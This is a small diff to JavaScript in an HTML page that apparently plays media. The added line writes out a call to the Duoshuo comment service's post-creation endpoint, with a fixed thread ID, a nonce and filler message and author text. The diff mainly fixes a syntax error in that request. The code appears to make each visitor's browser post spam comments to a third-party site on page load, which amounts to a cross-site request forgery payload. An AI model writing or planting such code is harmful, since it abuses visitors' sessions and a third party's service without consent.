@@ -88,9 +88,10 @@ if (GetParam()!= null)
 		
   }
 document.getElementById("media").play();
+var y="cb_"+Math.round(1e6*Math.random());
 
+document.write(postmydata("http://ddase.duoshuo.com/api/posts/create.jsonp?thread_id=6389930774455386882&parent_id=&nonce=58ae8983a43c1&message=dddddddddddddddddddddddd&author_name=dddddddddddddddddddddddd&v=16.6.16&_method=POST&callback=DUOSHUO.API%5B'"+y+"'%5D")); 
 
-document.write(postmydata("http://ddase.duoshuo.com/api/posts/create.jsonp?thread_id=6389930774455386882&parent_id=&nonce=58ae8983a43c1&message=dddddddddddddddddddddddd&author_name=dddddddddddddddddddddddd&v=16.6.16&_method=POST&callback=DUOSHUO.API%5B'"+Math.round(1e6*Math.random());+"'%5D")); 
 </script> 
 
 
